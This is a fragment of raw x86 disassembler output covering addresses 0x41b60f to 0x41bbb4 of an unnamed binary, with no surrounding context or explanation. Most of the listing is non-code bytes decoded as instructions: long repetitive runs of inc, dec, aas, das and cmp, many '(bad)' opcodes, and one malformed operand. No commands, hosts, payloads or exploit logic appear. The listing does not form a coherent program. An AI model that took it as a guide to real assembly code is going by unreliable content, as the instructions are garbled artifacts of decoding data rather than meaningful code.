  41b60f:	enter  0x5700,0xa9
  41b613:	int3   
  41b614:	add    BYTE PTR [edi-0x4b],dl
  41b617:	mov    BYTE PTR [eax],0x42
  41b61a:	lods   al,BYTE PTR ds:[esi]
  41b61b:	rol    DWORD PTR [eax],cl
  41b61d:	pop    eax
  41b61e:	scas   eax,DWORD PTR es:[edi]
  41b61f:	rol    DWORD PTR [eax],cl
  41b621:	dec    eax
  41b622:	mov    edx,0xbf5800d5
  41b627:	fiadd  DWORD PTR [eax]
  41b629:	imul   edi,DWORD PTR [ebx-0x54b4ff24],0xa46300ee
  41b633:	jmp    0x41b635
  41b635:	xor    ecx,ecx
  41b637:	fiadd  WORD PTR [eax]
  41b639:	pop    esp
  41b63a:	aam    0xdb
  41b63c:	add    BYTE PTR [edx-0x35],dh
  41b63f:	fild   WORD PTR [eax]
  41b641:	push   edx
  41b642:	(bad)
  41b645:	jg     0x41b618
  41b647:	in     eax,dx
  41b648:	add    BYTE PTR [ecx-0x74ff2b44],bl
  41b64e:	mov    eax,ds:0xe09200f9
  41b653:	fadd   QWORD PTR [eax]
  41b655:	stos   DWORD PTR es:[edi],eax
  41b656:	(bad)  
  41b658:	add    BYTE PTR [eax-0x38ff0a15],al
  41b65e:	idiv   ebp
  41b660:	add    bh,cl
  41b662:	add    BYTE PTR [esi-0x5bff1000],cl
  41b668:	add    bh,bh
  41b66a:	adc    DWORD PTR [ebx-0x41ce0100],esi
  41b670:	add    bh,bh
  41b672:	push   ecx
  41b673:	mov    DWORD PTR [eax],0xd171ff
  41b679:	call   DWORD PTR [ecx-0x4e00ff24]
  41b67f:	in     eax,0x0
  41b681:	call   ecx
  41b683:	lock add bh,bh
  41b686:	(bad)  
  41b687:	inc    DWORD PTR [eax]
  41b689:	add    BYTE PTR [eax],al
  41b68b:	add    BYTE PTR [eax],al
  41b68d:	sub    al,0x0
  41b68f:	das    
  41b690:	add    BYTE PTR [ebx+0x0],cl
  41b693:	push   eax
  41b694:	add    BYTE PTR [ecx+0x0],ch
  41b697:	jo     0x41b699
  41b699:	xchg   DWORD PTR [eax],eax
  41b69b:	nop
  41b69c:	add    BYTE PTR [ebp-0x3bff5000],ah
  41b6a2:	add    bh,cl
  41b6a4:	add    cl,ah
  41b6a6:	add    al,dh
  41b6a8:	add    al,dh
  41b6aa:	adc    edi,edi
  41b6ac:	add    dl,dh
  41b6ae:	xor    edi,edi
  41b6b0:	add    ah,dh
  41b6b2:	push   ecx
  41b6b3:	inc    DWORD PTR [eax]
  41b6b5:	div    BYTE PTR [ecx-0x1]
  41b6b8:	add    bh,dh
  41b6ba:	xchg   ecx,eax
  41b6bb:	inc    DWORD PTR [eax]
  41b6bd:	stc    
  41b6be:	mov    cl,0xff
  41b6c0:	add    bl,bh
  41b6c2:	sar    edi,1
  41b6c4:	add    bh,bh
  41b6c6:	(bad)  
  41b6c7:	inc    DWORD PTR [eax]
  41b6c9:	add    BYTE PTR [eax],al
  41b6cb:	add    BYTE PTR [eax],al
  41b6cd:	sbb    eax,DWORD PTR [eax]
  41b6cf:	das    
  41b6d0:	add    BYTE PTR ds:0x3f005000,ch
  41b6d6:	add    BYTE PTR [eax+0x0],dh
  41b6d9:	push   edx
  41b6da:	add    BYTE PTR [eax-0x4fff9d00],dl
  41b6e0:	add    BYTE PTR [esi+0x0],dh
  41b6e3:	iret   
  41b6e4:	add    BYTE PTR [eax-0x66ff1000],cl
  41b6ea:	adc    edi,edi
  41b6ec:	add    BYTE PTR [esi-0x4bff00cf],ah
  41b6f2:	push   ecx
  41b6f3:	inc    DWORD PTR [eax]
  41b6f5:	ret    0xff71
  41b6f8:	add    bh,cl
  41b6fa:	xchg   ecx,eax
  41b6fb:	inc    DWORD PTR [eax]
  41b6fd:	fdiv   QWORD PTR [ecx-0x2e14ff01]
  41b703:	inc    DWORD PTR [eax]
  41b705:	(bad)  
  41b706:	(bad)  
  41b707:	inc    DWORD PTR [eax]
  41b709:	add    BYTE PTR [eax],al
  41b70b:	add    BYTE PTR [eax],al
  41b70d:	or     BYTE PTR [eax],al
  41b70f:	das    
  41b710:	add    BYTE PTR [esi],cl
  41b712:	add    BYTE PTR [eax+0x0],dl
  41b715:	adc    eax,0x1b007000
  41b71a:	add    BYTE PTR [eax-0x4fffdf00],dl
  41b720:	add    BYTE PTR [esi],ah
  41b722:	add    bh,cl
  41b724:	add    BYTE PTR [eax+eax*1],ch
  41b727:	lock add BYTE PTR [esi],bh
  41b72a:	adc    edi,edi
  41b72c:	add    BYTE PTR [eax+0x31],bl
  41b72f:	inc    DWORD PTR [eax]
  41b731:	jno    0x41b784
  41b733:	inc    DWORD PTR [eax]
  41b735:	mov    WORD PTR [ecx-0x1],?
  41b738:	add    BYTE PTR [esi-0x40ff006f],ah
  41b73e:	mov    cl,0xff
  41b740:	add    dl,bl
  41b742:	sar    edi,1
  41b744:	add    bh,bh
  41b746:	(bad)  
  41b747:	inc    DWORD PTR [eax]
  41b749:	add    BYTE PTR [eax],al
  41b74b:	aaa    
  41b74c:	sub    DWORD PTR [ecx],esi
  41b74e:	xor    DWORD PTR [eax],edi
  41b750:	cmp    BYTE PTR [ecx],dh
  41b752:	xor    DWORD PTR [ecx],esi
  41b754:	xor    DWORD PTR [eax],edi
  41b756:	cmp    al,BYTE PTR [eax+0x38]
  41b759:	das    
  41b75a:	inc    eax
  41b75b:	aas    
  41b75c:	cmp    bh,BYTE PTR [edi]
  41b75e:	aas    
  41b75f:	aas    
  41b760:	aas    
  41b761:	inc    eax
  41b762:	aas    
  41b763:	dec    esp
  41b764:	dec    esp
  41b765:	dec    ebp
  41b766:	dec    ebp
  41b767:	dec    ebp
  41b768:	inc    eax
  41b769:	dec    ebp
  41b76a:	dec    ebp
  41b76b:	push   ecx
  41b76c:	dec    ebp
  41b76d:	pop    edx
  41b76e:	dec    esp
  41b76f:	inc    eax
  41b770:	aas    
  41b771:	dec    esp
  41b772:	inc    eax
  41b773:	inc    eax
  41b774:	dec    esp
  41b775:	dec    esp
  41b776:	aas    
  41b777:	aas    
  41b778:	aas    
  41b779:	aas    
  41b77a:	cmp    BYTE PTR [edx],bh
  41b77c:	cmp    bh,BYTE PTR [edx]
  41b77e:	cmp    al,BYTE PTR [eax+0x40]
  41b781:	inc    eax
  41b782:	inc    eax
  41b783:	inc    eax
  41b784:	cmp    cl,BYTE PTR [ecx+0x0]
  41b787:	add    BYTE PTR [eax],al
  41b789:	add    BYTE PTR [ecx],ah
  41b78b:	daa    
  41b78c:	das    
  41b78d:	das    
  41b78e:	das    
  41b78f:	das    
  41b790:	cmp    BYTE PTR [edx],bh
  41b792:	aas    
  41b793:	aas    
  41b794:	cmp    al,BYTE PTR [eax+0x3a]
  41b797:	aas    
  41b798:	aas    
  41b799:	aas    
  41b79a:	aas    
  41b79b:	inc    eax
  41b79c:	dec    esp
  41b79d:	cmp    cl,BYTE PTR [ebp+0x53]
  41b7a0:	dec    ebp
  41b7a1:	dec    esp
  41b7a2:	inc    eax
  41b7a3:	dec    ebp
  41b7a4:	aas    
  41b7a5:	aas    
  41b7a6:	dec    ebp
  41b7a7:	push   ecx
  41b7a8:	inc    eax
  41b7a9:	dec    esp
  41b7aa:	dec    ebp
  41b7ab:	aas    
  41b7ac:	dec    esp
  41b7ad:	pop    edx
  41b7ae:	pop    edx
  41b7af:	push   ebx
  41b7b0:	inc    eax
  41b7b1:	dec    ebp
  41b7b2:	dec    esp
  41b7b3:	dec    esp
  41b7b4:	dec    esp
  41b7b5:	push   ecx
  41b7b6:	dec    esp
  41b7b7:	inc    eax
  41b7b8:	inc    eax
  41b7b9:	aas    
  41b7ba:	cmp    bh,BYTE PTR [edx]
  41b7bc:	cmp    BYTE PTR [edi],bh
  41b7be:	inc    eax
  41b7bf:	aas    
  41b7c0:	inc    eax
  41b7c1:	inc    eax
  41b7c2:	aas    
  41b7c3:	aas    
  41b7c4:	dec    esp
  41b7c5:	inc    eax
  41b7c6:	cmp    al,0x0
  41b7c8:	add    BYTE PTR [eax],ah
  41b7ca:	and    eax,0x25272f2f
  41b7cf:	das    
  41b7d0:	das    
  41b7d1:	das    
  41b7d2:	xor    DWORD PTR [edx],edi
  41b7d4:	cmp    cl,BYTE PTR [ebp+ecx*2+0x3f]
  41b7d8:	aas    
  41b7d9:	aas    
  41b7da:	inc    eax
  41b7db:	aas    
  41b7dc:	dec    esp
  41b7dd:	dec    esp
  41b7de:	dec    ebp
  41b7df:	dec    esp
  41b7e0:	dec    ebp
  41b7e1:	aas    
  41b7e2:	inc    eax
  41b7e3:	dec    esp
  41b7e4:	push   ecx
  41b7e5:	dec    ebp
  41b7e6:	dec    esp
  41b7e7:	inc    eax
  41b7e8:	push   ecx
  41b7e9:	dec    ebp
  41b7ea:	dec    ebp
  41b7eb:	inc    eax
  41b7ec:	inc    eax
  41b7ed:	dec    ebp
  41b7ee:	pop    edx
  41b7ef:	pop    edx
  41b7f0:	pop    edx
  41b7f1:	dec    ebp
  41b7f2:	dec    esp
  41b7f3:	inc    eax
  41b7f4:	aas    
  41b7f5:	dec    ebp
  41b7f6:	dec    esp
  41b7f7:	cmp    bh,BYTE PTR [edx]
  41b7f9:	cmp    al,BYTE PTR [eax+0x3f]
  41b7fc:	aas    
  41b7fd:	aas    
  41b7fe:	inc    eax
  41b7ff:	cmp    cl,BYTE PTR [eax+eax*2+0x3f]
  41b803:	aas    
  41b804:	inc    eax
  41b805:	dec    esp
  41b806:	cmp    bh,BYTE PTR [esi]
  41b808:	add    BYTE PTR ds:0x312f2725,bl
  41b80e:	daa    
  41b80f:	das    
  41b810:	das    
  41b811:	das    
  41b812:	xor    DWORD PTR [eax],edi
  41b814:	cmp    BYTE PTR [ebp+0x4c],cl
  41b817:	inc    eax
  41b818:	aas    
  41b819:	inc    eax
  41b81a:	inc    eax
  41b81b:	dec    ebp
  41b81c:	dec    esp
  41b81d:	push   ecx
  41b81e:	push   ebx
  41b81f:	dec    ebp
  41b820:	inc    eax
  41b821:	aas    
  41b822:	dec    esp
  41b823:	dec    esp
  41b824:	aas    
  41b825:	dec    ebp
  41b826:	push   ecx
  41b827:	inc    eax
  41b828:	dec    esp
  41b829:	dec    esp
  41b82a:	dec    esp
  41b82b:	push   ebx
  41b82c:	push   ecx
  41b82d:	pop    edx
  41b82e:	pop    edx
  41b82f:	push   ecx
  41b830:	push   ecx
  41b831:	push   ecx
  41b832:	push   ebx
  41b833:	dec    esp
  41b834:	dec    esp
  41b835:	dec    ebp
  41b836:	dec    esp
  41b837:	dec    ebp
  41b838:	dec    ebp
  41b839:	dec    esp
  41b83a:	inc    eax
  41b83b:	inc    eax
  41b83c:	dec    esp
  41b83d:	inc    eax
  41b83e:	aas    
  41b83f:	cmp    bh,BYTE PTR [edi]
  41b841:	aas    
  41b842:	aas    
  41b843:	aas    
  41b844:	cmp    bh,BYTE PTR [edi]
  41b846:	inc    eax
  41b847:	xor    DWORD PTR [ecx+0x27],ecx
  41b84a:	das    
  41b84b:	xor    DWORD PTR [eax],edi
  41b84d:	cmp    bh,BYTE PTR [edi]
  41b84f:	xor    DWORD PTR [edi],ebp
  41b851:	das    
  41b852:	cmp    BYTE PTR [ecx],dh
  41b854:	xor    DWORD PTR [eax],edi
  41b856:	aas    
  41b857:	cmp    bh,BYTE PTR [edi]
  41b859:	aas    
  41b85a:	aas    
  41b85b:	cmp    al,BYTE PTR [eax+0x3a]
  41b85e:	inc    eax
  41b85f:	dec    ebp
  41b860:	dec    esp
  41b861:	inc    eax
  41b862:	inc    eax
  41b863:	dec    ebp
  41b864:	dec    ebp
  41b865:	push   ecx
  41b866:	dec    esp
  41b867:	dec    ebp
  41b868:	pop    edx
  41b869:	push   ebx
  41b86a:	dec    ebp
  41b86b:	push   ecx
  41b86c:	push   ecx
  41b86d:	pop    edx
  41b86e:	push   ebx
  41b86f:	push   ecx
  41b870:	dec    ebp
  41b871:	aas    
  41b872:	dec    ebp
  41b873:	dec    ebp
  41b874:	push   ecx
  41b875:	dec    esp
  41b876:	dec    esp
  41b877:	inc    eax
  41b878:	dec    esp
  41b879:	inc    eax
  41b87a:	inc    eax
  41b87b:	inc    eax
  41b87c:	dec    esp
  41b87d:	dec    esp
  41b87e:	cmp    al,BYTE PTR [eax+0x3f]
  41b881:	cmp    bh,BYTE PTR [edx]
  41b883:	cmp    bh,BYTE PTR [edx]
  41b885:	cmp    bh,BYTE PTR [edx]
  41b887:	cmp    BYTE PTR [esi],ch
  41b889:	sbb    DWORD PTR ds:0x2f2f272f,esp
  41b88f:	cmp    BYTE PTR [edx],bh
  41b891:	cmp    BYTE PTR [edx],bh
  41b893:	cmp    bh,BYTE PTR [edi]
  41b895:	xor    DWORD PTR [eax],edi
  41b897:	aas    
  41b898:	cmp    BYTE PTR [ecx],dh
  41b89a:	cmp    bh,BYTE PTR [edx]
  41b89c:	cmp    al,BYTE PTR [eax+0x3a]
  41b89f:	aas    
  41b8a0:	dec    esp
  41b8a1:	dec    ebp
  41b8a2:	dec    esp
  41b8a3:	aas    
  41b8a4:	dec    ebp
  41b8a5:	dec    ebp
  41b8a6:	push   ebx
  41b8a7:	push   ecx
  41b8a8:	dec    ebp
  41b8a9:	push   ecx
  41b8aa:	push   ebx
  41b8ab:	push   ecx
  41b8ac:	push   ebx
  41b8ad:	push   ebx
  41b8ae:	pop    edx
  41b8af:	dec    ebp
  41b8b0:	dec    ebp
  41b8b1:	inc    eax
  41b8b2:	push   ecx
  41b8b3:	dec    ebp
  41b8b4:	dec    esp
  41b8b5:	dec    esp
  41b8b6:	dec    esp
  41b8b7:	dec    esp
  41b8b8:	dec    esp
  41b8b9:	aas    
  41b8ba:	aas    
  41b8bb:	aas    
  41b8bc:	aas    
  41b8bd:	aas    
  41b8be:	aas    
  41b8bf:	cmp    bh,BYTE PTR [edx]
  41b8c1:	cmp    bh,BYTE PTR [edx]
  41b8c3:	cmp    BYTE PTR [edi],bh
  41b8c5:	cmp    bh,BYTE PTR [eax]
  41b8c7:	xor    DWORD PTR [edi],esp
  41b8c9:	sbb    eax,0x272f2725
  41b8ce:	daa    
  41b8cf:	daa    
  41b8d0:	das    
  41b8d1:	cmp    BYTE PTR [edx],bh
  41b8d3:	cmp    BYTE PTR [edx],bh
  41b8d5:	aas    
  41b8d6:	aas    
  41b8d7:	aas    
  41b8d8:	cmp    BYTE PTR [edi],bh
  41b8da:	cmp    al,BYTE PTR [eax+0x3f]
  41b8dd:	cmp    BYTE PTR [edi],bh
  41b8df:	inc    eax
  41b8e0:	dec    ebp
  41b8e1:	aas    
  41b8e2:	cmp    al,BYTE PTR [eax+0x40]
  41b8e5:	inc    eax
  41b8e6:	dec    ebp
  41b8e7:	push   ebx
  41b8e8:	push   ecx
  41b8e9:	push   ecx
  41b8ea:	push   ecx
  41b8eb:	pop    edx
  41b8ec:	push   ebx
  41b8ed:	push   ebx
  41b8ee:	push   ebx
  41b8ef:	push   ecx
  41b8f0:	dec    ebp
  41b8f1:	inc    eax
  41b8f2:	dec    esp
  41b8f3:	dec    esp
  41b8f4:	dec    esp
  41b8f5:	inc    eax
  41b8f6:	dec    ebp
  41b8f7:	dec    esp
  41b8f8:	dec    ebp
  41b8f9:	aas    
  41b8fa:	aas    
  41b8fb:	aas    
  41b8fc:	aas    
  41b8fd:	inc    eax
  41b8fe:	aas    
  41b8ff:	cmp    bh,BYTE PTR [eax]
  41b901:	cmp    bh,BYTE PTR [eax]
  41b903:	cmp    BYTE PTR [eax],bh
  41b905:	cmp    bh,BYTE PTR [eax]
  41b907:	cmp    ch,BYTE PTR [edi]
  41b909:	sbb    eax,0x2f271d25
  41b90e:	das    
  41b90f:	das    
  41b910:	daa    
  41b911:	daa    
  41b912:	das    
  41b913:	cmp    BYTE PTR [ecx],dh
  41b915:	cmp    BYTE PTR [ecx],dh
  41b917:	xor    DWORD PTR [ecx],esi
  41b919:	cmp    bh,BYTE PTR [edx]
  41b91b:	inc    eax
  41b91c:	inc    eax
  41b91d:	cmp    bh,BYTE PTR [edi]
  41b91f:	aas    
  41b920:	inc    eax
  41b921:	dec    esp
  41b922:	cmp    al,BYTE PTR [eax+0x4d]
  41b925:	dec    ebp
  41b926:	dec    ebp
  41b927:	dec    ebp
  41b928:	push   ebx
  41b929:	push   ebx
  41b92a:	push   ebx
  41b92b:	pop    edx
  41b92c:	push   ebx
  41b92d:	pop    edx
  41b92e:	pop    edx
  41b92f:	push   ecx
  41b930:	dec    ebp
  41b931:	dec    esp
  41b932:	dec    ebp
  41b933:	dec    ebp
  41b934:	push   ecx
  41b935:	inc    eax
  41b936:	inc    eax
  41b937:	inc    eax
  41b938:	inc    eax
  41b939:	inc    eax
  41b93a:	dec    esp
  41b93b:	aas    
  41b93c:	cmp    bh,BYTE PTR [edx]
  41b93e:	cmp    BYTE PTR [eax],bh
  41b940:	cmp    BYTE PTR [edi],ch
  41b942:	cmp    bh,BYTE PTR [edi]
  41b944:	cmp    BYTE PTR [eax],bh
  41b946:	das    
  41b947:	xor    DWORD PTR [edi],esp
  41b949:	sbb    eax,0x2f272f27
  41b94e:	xor    DWORD PTR [edi],ebp
  41b950:	das    
  41b951:	xor    DWORD PTR [edi],ebp
  41b953:	xor    DWORD PTR [edx],edi
  41b955:	cmp    bh,BYTE PTR [edx]
  41b957:	cmp    dh,BYTE PTR [ecx]
  41b959:	cmp    BYTE PTR [eax],bh
  41b95b:	das    
  41b95c:	das    
  41b95d:	cmp    al,BYTE PTR [eax+0x3a]
  41b960:	aas    
  41b961:	aas    
  41b962:	aas    
  41b963:	inc    eax
  41b964:	push   ecx
  41b965:	dec    ebp
  41b966:	dec    ebp
  41b967:	pop    edx
  41b968:	push   ebx
  41b969:	dec    esp
  41b96a:	push   ebx
  41b96b:	pop    edx
  41b96c:	push   ecx
  41b96d:	push   ecx
  41b96e:	push   ecx
  41b96f:	dec    ebp
  41b970:	push   ecx
  41b971:	push   ecx
  41b972:	dec    ebp
  41b973:	inc    eax
  41b974:	inc    eax
  41b975:	dec    esp
  41b976:	dec    esp
  41b977:	dec    esp
  41b978:	dec    ebp
  41b979:	inc    eax
  41b97a:	dec    esp
  41b97b:	inc    eax
  41b97c:	cmp    bh,BYTE PTR [eax]
  41b97e:	das    
  41b97f:	cmp    BYTE PTR [edi],bh
  41b981:	xor    DWORD PTR [eax],edi
  41b983:	cmp    BYTE PTR [eax],bh
  41b985:	xor    DWORD PTR [ecx],esi
  41b987:	das    
  41b988:	and    eax,0x2f27251d
  41b98d:	xor    DWORD PTR [edi],ebp
  41b98f:	xor    DWORD PTR [edx],edi
  41b991:	cmp    bh,BYTE PTR [edx]
  41b993:	cmp    BYTE PTR [edi],ch
  41b995:	cmp    BYTE PTR [eax+0x3f],al
  41b998:	cmp    BYTE PTR [ecx],dh
  41b99a:	cmp    BYTE PTR [edi],ch
  41b99c:	cmp    BYTE PTR [eax+0x40],al
  41b99f:	inc    eax
  41b9a0:	aas    
  41b9a1:	cmp    dl,BYTE PTR [ecx+0x4c]
  41b9a4:	dec    esp
  41b9a5:	dec    ebp
  41b9a6:	dec    ebp
  41b9a7:	dec    esp
  41b9a8:	dec    ebp
  41b9a9:	aas    
  41b9aa:	dec    ebp
  41b9ab:	dec    esp
  41b9ac:	dec    esp
  41b9ad:	pop    edx
  41b9ae:	push   ebx
  41b9af:	dec    ebp
  41b9b0:	dec    ebp
  41b9b1:	dec    esp
  41b9b2:	dec    ebp
  41b9b3:	dec    esp
  41b9b4:	aas    
  41b9b5:	push   ebx
  41b9b6:	inc    eax
  41b9b7:	dec    esp
  41b9b8:	inc    eax
  41b9b9:	dec    esp
  41b9ba:	aas    
  41b9bb:	aas    
  41b9bc:	cmp    bh,BYTE PTR [edi]
  41b9be:	cmp    bh,BYTE PTR [edx]
  41b9c0:	cmp    BYTE PTR [edx],bh
  41b9c2:	cmp    dh,BYTE PTR [ecx]
  41b9c4:	das    
  41b9c5:	das    
  41b9c6:	cmp    BYTE PTR [ecx],dh
  41b9c8:	daa    
  41b9c9:	sbb    eax,0x272f2725
  41b9ce:	daa    
  41b9cf:	das    
  41b9d0:	and    eax,0x313a3f31
  41b9d5:	cmp    bh,BYTE PTR [edi]
  41b9d7:	aas    
  41b9d8:	cmp    BYTE PTR [edx],bh
  41b9da:	cmp    bh,BYTE PTR [edx]
  41b9dc:	inc    eax
  41b9dd:	inc    eax
  41b9de:	dec    esp
  41b9df:	aas    
  41b9e0:	cmp    bh,BYTE PTR [edi]
  41b9e2:	push   ecx
  41b9e3:	dec    esp
  41b9e4:	dec    ebp
  41b9e5:	dec    ebp
  41b9e6:	dec    ebp
  41b9e7:	dec    esp
  41b9e8:	inc    eax
  41b9e9:	inc    eax
  41b9ea:	push   ecx
  41b9eb:	dec    ebp
  41b9ec:	dec    esp
  41b9ed:	push   ebx
  41b9ee:	push   ecx
  41b9ef:	dec    ebp
  41b9f0:	push   ecx
  41b9f1:	dec    ebp
  41b9f2:	dec    esp
  41b9f3:	inc    eax
  41b9f4:	inc    eax
  41b9f5:	dec    esp
  41b9f6:	inc    eax
  41b9f7:	dec    esp
  41b9f8:	inc    eax
  41b9f9:	aas    
  41b9fa:	aas    
  41b9fb:	cmp    bh,BYTE PTR [edx]
  41b9fd:	aas    
  41b9fe:	aas    
  41b9ff:	cmp    BYTE PTR [eax],bh
  41ba01:	cmp    bh,BYTE PTR [eax]
  41ba03:	cmp    ch,BYTE PTR [edi]
  41ba05:	xor    DWORD PTR [eax],edi
  41ba07:	das    
  41ba08:	and    eax,0x251d251d
  41ba0d:	daa    
  41ba0e:	das    
  41ba0f:	das    
  41ba10:	and    eax,0x2f2f2f27
  41ba15:	cmp    bh,BYTE PTR [edi]
  41ba17:	cmp    bh,BYTE PTR [edx]
  41ba19:	cmp    bh,BYTE PTR [edi]
  41ba1b:	aas    
  41ba1c:	inc    eax
  41ba1d:	inc    eax
  41ba1e:	inc    eax
  41ba1f:	inc    eax
  41ba20:	inc    eax
  41ba21:	dec    esp
  41ba22:	dec    ebp
  41ba23:	dec    esp
  41ba24:	inc    eax
  41ba25:	dec    esp
  41ba26:	aas    
  41ba27:	push   ecx
  41ba28:	dec    esp
  41ba29:	inc    eax
  41ba2a:	dec    esp
  41ba2b:	dec    esp
  41ba2c:	dec    esp
  41ba2d:	dec    ebp
  41ba2e:	inc    eax
  41ba2f:	inc    eax
  41ba30:	dec    esp
  41ba31:	dec    ebp
  41ba32:	push   ecx
  41ba33:	dec    esp
  41ba34:	dec    esp
  41ba35:	inc    eax
  41ba36:	aas    
  41ba37:	inc    eax
  41ba38:	aas    
  41ba39:	aas    
  41ba3a:	aas    
  41ba3b:	aas    
  41ba3c:	cmp    bh,BYTE PTR [edx]
  41ba3e:	cmp    bh,BYTE PTR [eax]
  41ba40:	xor    DWORD PTR [ecx],esi
  41ba42:	das    
  41ba43:	xor    DWORD PTR [edi],ebp
  41ba45:	das    
  41ba46:	das    
  41ba47:	daa    
  41ba48:	sbb    eax,0x272f271d
  41ba4d:	daa    
  41ba4e:	das    
  41ba4f:	xor    DWORD PTR [edi],ebp
  41ba51:	das    
  41ba52:	xor    DWORD PTR [ecx],esi
  41ba54:	das    
  41ba55:	cmp    BYTE PTR [eax],bh
  41ba57:	cmp    BYTE PTR [edx],bh
  41ba59:	cmp    BYTE PTR [edx],bh
  41ba5b:	aas    
  41ba5c:	dec    esp
  41ba5d:	inc    eax
  41ba5e:	dec    ebp
  41ba5f:	inc    eax
  41ba60:	inc    eax
  41ba61:	aas    
  41ba62:	inc    eax
  41ba63:	dec    esp
  41ba64:	inc    eax
  41ba65:	aas    
  41ba66:	cmp    cl,BYTE PTR [ebp+0x40]
  41ba69:	aas    
  41ba6a:	inc    eax
  41ba6b:	inc    eax
  41ba6c:	aas    
  41ba6d:	dec    esp
  41ba6e:	dec    ebp
  41ba6f:	inc    eax
  41ba70:	dec    esp
  41ba71:	dec    esp
  41ba72:	dec    esp
  41ba73:	dec    ebp
  41ba74:	dec    ebp
  41ba75:	aas    
  41ba76:	aas    
  41ba77:	dec    esp
  41ba78:	cmp    bh,BYTE PTR [edx]
  41ba7a:	aas    
  41ba7b:	cmp    bh,BYTE PTR [edx]
  41ba7d:	cmp    bh,BYTE PTR [edi]
  41ba7f:	cmp    BYTE PTR [eax],bh
  41ba81:	xor    DWORD PTR [ecx],esi
  41ba83:	xor    DWORD PTR [ecx],esi
  41ba85:	das    
  41ba86:	das    
  41ba87:	daa    
  41ba88:	sbb    eax,0x27272725
  41ba8d:	daa    
  41ba8e:	daa    
  41ba8f:	daa    
  41ba90:	daa    
  41ba91:	xor    DWORD PTR [ecx],esi
  41ba93:	cmp    BYTE PTR [eax],al
  41ba95:	add    BYTE PTR [ebx],dl
  41ba97:	aas    
  41ba98:	cmp    al,BYTE PTR [eax+0x3a]
  41ba9b:	cmp    al,BYTE PTR [eax+0x3a]
  41ba9e:	dec    esp
  41ba9f:	inc    eax
  41baa0:	dec    esp
  41baa1:	dec    esp
  41baa2:	inc    eax
  41baa3:	inc    eax
  41baa4:	dec    esp
  41baa5:	aas    
  41baa6:	cmp    BYTE PTR [edi],bh
  41baa8:	cmp    bh,BYTE PTR [edi]
  41baaa:	dec    esp
  41baab:	dec    ebp
  41baac:	inc    eax
  41baad:	dec    esp
  41baae:	dec    ebp
  41baaf:	dec    esp
  41bab0:	dec    ebp
  41bab1:	dec    esp
  41bab2:	dec    esp
  41bab3:	inc    eax
  41bab4:	inc    eax
  41bab5:	dec    esp
  41bab6:	dec    esp
  41bab7:	aas    
  41bab8:	inc    eax
  41bab9:	aas    
  41baba:	aas    
  41babb:	cmp    bh,BYTE PTR [eax]
  41babd:	cmp    BYTE PTR [edi],ch
  41babf:	xor    DWORD PTR [eax],edi
  41bac1:	cmp    BYTE PTR [ecx],dh
  41bac3:	xor    DWORD PTR [edi],ebp
  41bac5:	das    
  41bac6:	das    
  41bac7:	das    
  41bac8:	and    eax,0x2727271d
  41bacd:	daa    
  41bace:	daa    
  41bacf:	das    
  41bad0:	and    eax,0x416312f
  41bad5:	adc    eax,0x3a311a00
  41bada:	aas    
  41badb:	aas    
  41badc:	dec    esp
  41badd:	aas    
  41bade:	aas    
  41badf:	inc    eax
  41bae0:	dec    esp
  41bae1:	dec    esp
  41bae2:	aas    
  41bae3:	dec    esp
  41bae4:	dec    ebp
  41bae5:	dec    esp
  41bae6:	inc    eax
  41bae7:	cmp    al,BYTE PTR [eax+0x40]
  41baea:	cmp    al,0x1
  41baec:	add    eax,0x1
  41baf1:	add    BYTE PTR [edx],al
  41baf3:	add    al,BYTE PTR [edx]
  41baf5:	add    BYTE PTR [edx],al
  41baf7:	add    BYTE PTR [eax],al
  41baf9:	add    al,BYTE PTR [edx]
  41bafb:	add    BYTE PTR [eax],al
  41bafd:	push   es
  41bafe:	xor    DWORD PTR [edi],ebp
  41bb00:	das    
  41bb01:	daa    
  41bb02:	das    
  41bb03:	das    
  41bb04:	xor    DWORD PTR [edi],esp
  41bb06:	and    eax,0x27191d27
  41bb0b:	das    
  41bb0c:	daa    
  41bb0d:	daa    
  41bb0e:	and    eax,0x2f272f27
  41bb13:	add    BYTE PTR [edi],ch
  41bb15:	xchg   esi,eax
  41bb16:	je     0x41bb1a
  41bb18:	add    BYTE PTR [edx],al
  41bb1a:	add    BYTE PTR [edx],al
  41bb1c:	add    BYTE PTR [ecx],al
  41bb1e:	add    BYTE PTR [eax],al
  41bb20:	add    BYTE PTR [eax],al
  41bb22:	add    BYTE PTR [eax],al
  41bb24:	add    BYTE PTR [eax],bh
  41bb26:	add    BYTE PTR [eax],al
  41bb28:	aas    
  41bb29:	sub    cl,BYTE PTR ds:0x9577744f
  41bb2f:	ja     0x41bba8
  41bb31:	ja     0x41bba6
  41bb33:	je     0x41bb75
  41bb35:	sbb    al,0x74
  41bb37:	je     0x41bbae
  41bb39:	jne    0x41bbac
  41bb3b:	je     0x41bb3f
  41bb3d:	add    al,BYTE PTR [eax]
  41bb3f:	xor    DWORD PTR [edi],ebp
  41bb41:	xor    DWORD PTR [edi],ebp
  41bb43:	xor    DWORD PTR [edi],ebp
  41bb45:	and    eax,0x1d1d2725
  41bb4a:	daa    
  41bb4b:	das    
  41bb4c:	das    
  41bb4d:	and    eax,0x272f251d
  41bb52:	add    eax,DWORD PTR [edx]
  41bb54:	xchg   esi,eax
  41bb55:	(bad)
  41bb58:	add    al,BYTE PTR [ecx+ebx*1]
  41bb5b:	inc    eax
  41bb5c:	cmp    ecx,DWORD PTR [edi+0x3c]
  41bb5f:	inc    ecx
  41bb60:	inc    eax
  41bb61:	pop    ebp
  41bb62:	jo     0x41baf9
  41bb64:	xchg   esi,eax
  41bb65:	rol    DWORD PTR [eax],0x0
  41bb68:	inc    eax
  41bb69:	pop    es
  41bb6a:	sbb    ebx,eax
  41bb6c:	lds    edi,FWORD PTR [edi-0x3a3b3c3b]
  41bb72:	(bad)
  41bb75:	jno    0x41bb1c
  41bb77:	(bad)
  41bb7a:	(bad)
  41bb7d:	lds    ecx,FWORD PTR [eax+0x2]
  41bb80:	daa    
  41bb81:	das    
  41bb82:	daa    
  41bb83:	daa    
  41bb84:	das    
  41bb85:	daa    
  41bb86:	daa    
  41bb87:	and    eax,0x25271d19
  41bb8c:	and    eax,0x1d251d1d
  41bb91:	push   ss
  41bb92:	add    dh,BYTE PTR [ebx+eax*8-0x4d]
  41bb96:	test   eax,0x6795c3c3
  41bb9b:	(bad)
  41bb9e:	(bad)
  41bba1:	(bad)
  41bba4:	(bad)
  41bba7:	aas    
  41bba8:	aas    
  41bba9:	dec    esp
  41bbaa:	add    bl,BYTE PTR [eax]
  41bbac:	lds    edi,FWORD PTR [ecx-0x4456445a]
  41bbb2:	mov    ah,0xa3
  41bbb4:	mov    ebp,0xa9b774b8
